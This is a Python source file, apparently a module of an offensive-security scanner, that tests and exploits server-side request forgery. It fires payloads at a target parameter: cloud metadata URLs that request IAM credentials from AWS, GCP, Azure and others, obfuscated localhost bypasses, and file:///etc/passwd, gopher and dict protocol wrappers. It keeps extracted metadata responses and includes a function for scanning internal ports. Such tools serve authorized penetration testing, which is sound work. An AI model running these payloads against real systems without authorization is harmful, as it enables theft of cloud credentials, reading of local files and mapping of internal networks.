#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SSRF Module
Server-Side Request Forgery detection and exploitation
"""

import os
import sys
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Payloads, Colors


class SSRFModule:
    """SSRF Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SSRF"
        
        # Cloud metadata endpoints
        self.cloud_endpoints = {
            'aws': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data',
            ],
            'gcp': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://169.254.169.254/computeMetadata/v1/',
            ],
            'azure': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            ],
            'digitalocean': [
                'http://169.254.169.254/metadata/v1/',
            ],
            'alibaba': [
                'http://100.100.100.200/latest/meta-data/',
            ],
        }
        
        # SSRF response indicators (more specific to avoid false positives)
        self.ssrf_indicators = {
            'strong': [
                'ami-id',
                'instance-id',
                'instance-type',
                'AccessKeyId',
                'SecretAccessKey',
                'computeMetadata',
                'security-credentials',
            ],
            'weak': [
                'local-hostname',
                'local-ipv4',
                'public-hostname',
                'public-ipv4',
                'security-groups',
                'ec2',
                'Token',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for SSRF"""
        # Test internal endpoints
        self._test_internal(url, method, param, value)
        
        # Test cloud metadata
        self._test_cloud_metadata(url, method, param, value)
        
        # Test localhost variants
        self._test_localhost(url, method, param, value)
        
        # Test protocol wrappers
        self._test_protocols(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for SSRF"""
        pass
    
    def _test_internal(self, url: str, method: str, param: str, value: str):
        """Test for internal network access"""
        internal_targets = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://0177.0.0.1',
            'http://2130706433',
            'http://0x7f.0.0.1',
            'http://0x7f000001',
        ]
        
        for target in internal_targets:
            try:
                data = {param: target}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for successful internal access
                if response.status_code == 200 and len(response.text) > 0:
                    # Check if it's not just an error page
                    if not any(err in response.text.lower() for err in ['error', 'not found', 'forbidden']):
                        from core.engine import Finding
                        finding = Finding(
                            technique="SSRF (Internal Access)",
                            url=url,
                            severity='HIGH',
                            confidence=0.8,
                            param=param,
                            payload=target,
                            evidence=f"Internal endpoint accessible: {target}",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SSRF internal test error: {e}')}")
    
    def _test_cloud_metadata(self, url: str, method: str, param: str, value: str):
        """Test for cloud metadata access"""
        for cloud, endpoints in self.cloud_endpoints.items():
            for endpoint in endpoints:
                try:
                    headers = {}
                    if cloud == 'gcp':
                        headers['Metadata-Flavor'] = 'Google'
                    elif cloud == 'azure':
                        headers['Metadata'] = 'true'
                    
                    data = {param: endpoint}
                    response = self.requester.request(url, method, data=data, headers=headers)
                    
                    if not response:
                        continue
                    
                    # Check for cloud metadata indicators
                    # Require at least 1 strong indicator or 3+ weak indicators
                    strong_count = sum(1 for ind in self.ssrf_indicators['strong'] if ind.lower() in response.text.lower())
                    weak_count = sum(1 for ind in self.ssrf_indicators['weak'] if ind.lower() in response.text.lower())
                    
                    if strong_count >= 1 or weak_count >= 3:
                        from core.engine import Finding
                        finding = Finding(
                            technique=f"SSRF ({cloud.upper()} Metadata)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.95,
                            param=param,
                            payload=endpoint,
                            evidence=f"Cloud metadata accessible: {cloud}",
                            extracted_data=response.text[:500],
                        )
                        self.engine.add_finding(finding)
                        return
                        
                except Exception as e:
                    if self.engine.config.get('verbose'):
                        print(f"{Colors.error(f'SSRF cloud test error: {e}')}")
    
    def _test_localhost(self, url: str, method: str, param: str, value: str):
        """Test localhost bypass techniques"""
        bypass_techniques = [
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:3000',
            'http://127.0.0.1:8000',
            'http://127.0.0.1:9000',
            'http://127.1',
            'http://0.0.0.0',
            'http://0',
            'http://0177.0.0.01',
            'http://0x7f.0.0.1',
            'http://2130706433',
            'http://[::]',
            'http://[::ffff:127.0.0.1]',
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
        ]
        
        for payload in bypass_techniques:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for successful access
                if response.status_code == 200 and len(response.text) > 10:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SSRF (Localhost Bypass)",
                        url=url,
                        severity='HIGH',
                        confidence=0.75,
                        param=param,
                        payload=payload,
                        evidence=f"Localhost accessible via: {payload}",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SSRF localhost test error: {e}')}")
    
    def _test_protocols(self, url: str, method: str, param: str, value: str):
        """Test different protocols"""
        protocols = [
            'file:///etc/passwd',
            'file:///C:/windows/win.ini',
            'dict://localhost:11211/',
            'gopher://localhost:9000/_',
            'ftp://anonymous@localhost/',
            'ldap://localhost:389/',
            'tftp://localhost:69/test',
        ]
        
        for protocol in protocols:
            try:
                data = {param: protocol}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for protocol-specific responses
                if protocol.startswith('file://'):
                    if 'root:x:' in response.text or 'for 16-bit app support' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="SSRF (File Protocol)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=protocol,
                            evidence="Local file readable via file:// protocol",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SSRF protocol test error: {e}')}")
    
    def exploit_scan_port(self, url: str, param: str, host: str, port: int) -> bool:
        """Scan internal port via SSRF"""
        try:
            payload = f"http://{host}:{port}"
            data = {param: payload}
            response = self.requester.request(url, 'GET', data=data)
            
            if response:
                # Analyze response to determine if port is open
                if response.status_code == 200 or len(response.text) > 0:
                    return True
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Port scan error: {e}')}")
        
        return False
